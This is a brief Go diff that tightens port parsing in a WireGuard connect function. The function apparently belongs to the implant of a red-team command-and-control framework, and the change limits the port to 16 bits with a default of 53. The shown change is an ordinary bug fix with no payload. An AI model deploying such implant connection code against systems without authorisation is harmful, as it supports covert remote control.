@@ -333,13 +333,14 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 		// {{if .Config.Debug}}
 		log.Printf("Connecting -> %s", uri.Host)
 		// {{end}}
-		lport, err := strconv.Atoi(uri.Port())
-		if err != nil {
+		lport64, err := strconv.ParseUint(uri.Port(), 10, 16)
+		if err != nil || lport64 > 65535 {
 			// {{if .Config.Debug}}
 			log.Printf("Error parsing wg listen port %s (default to 53)", err)
 			// {{end}}
-			lport = 53
+			lport64 = 53
 		}
+		lport := uint16(lport64)
 		// Attempt to resolve the hostname in case
 		// we received a domain name and not an IP address.
 		// net.LookupHost() will still work with an IP address
